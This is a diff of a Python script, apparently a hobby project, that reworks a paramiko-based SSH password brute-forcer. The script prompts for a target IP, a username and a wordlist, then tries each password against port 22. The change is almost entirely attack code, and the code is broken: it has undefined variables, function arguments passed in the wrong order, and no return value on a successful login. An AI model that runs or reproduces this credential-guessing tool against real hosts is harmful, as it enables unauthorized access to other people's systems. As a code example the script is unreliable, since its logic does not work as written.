@@ -14,47 +14,34 @@ import paramiko
 import os
 import socket
 
+def cracker(user, ipAddress, txtFile ):
+    filepath =open(txtFile)
+    for i in filepath.readlines():
+        secret=i.strip("\n")
+        try:
+            response= bruteForceSSH(secret, user, ipAddress)
+            if response ==0:
+                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, secret, line))
+                sys.exit(0)
+            elif response ==1:
+                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, line))
+            elif response ==2:
+                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, password, line))
+        except Exception:
+            print(Exception)
+            pass
 
-def bruteForceSSH(password, code =O):
-
+def bruteForceSSH(secret, ipAddress, user):
     ssh=paramiko.SSHClient()
     # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
     try:
-        ssh.connect(host,port=22, username=user, password=password)
+        ssh.connect(host=ipAddress,port=22, username=user, password=secret)
     except paramiko.AuthenticationException:
         code =1
-    # except socket.error, e:
-    #     code =2
+    except socket.error:
+        code =2
     ssh.close()
     return code
-
-def cracker(user, ipAddress, txtFile, ):
-    filepath =txtFile
-    for i in filepath.readlines():
-        password=i.strip("\n")
-    with open(filepath) as fp:
-        line = fp.readline()
-        while line:
-            print("{}".format(line.strip()))
-            line = fp.readline()
-            # print(line)
-            time.sleep(1)
-# def mode2():
-#     passwordCheck=input("Please enter the password to check.   ")
-#     filepath =input("What is the file path of the text file?   ")
-#     with open(filepath) as fp:
-#         line = fp.readline()
-#         while line:
-#             line=line.strip()
-#             if line == passwordCheck:
-#                 print("Your password of {} is a match in the dictionary".format(passwordCheck))
-#                 break
-#             else:
-#                 print("{}".format(line.strip()))
-#                 line = fp.readline()
-
-# usr_password = getpass.getpass(prompt=“please enter your password”)
-
 
 
 def main():
@@ -62,10 +49,10 @@ def main():
     user=input("What is the username for the SSH connection?")
     ipAddress=input("What is the ip address of the target system?")
     txtFile=input("What is the folder path to your dictionary file?")
-    bruteForceSSH()
+    cracker(user, ipAddress, txtFile)
     
 main()
 
 
 
-# with help from https://stackabuse.com/read-a-file-line-by-line-in-python/
+# with help from https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
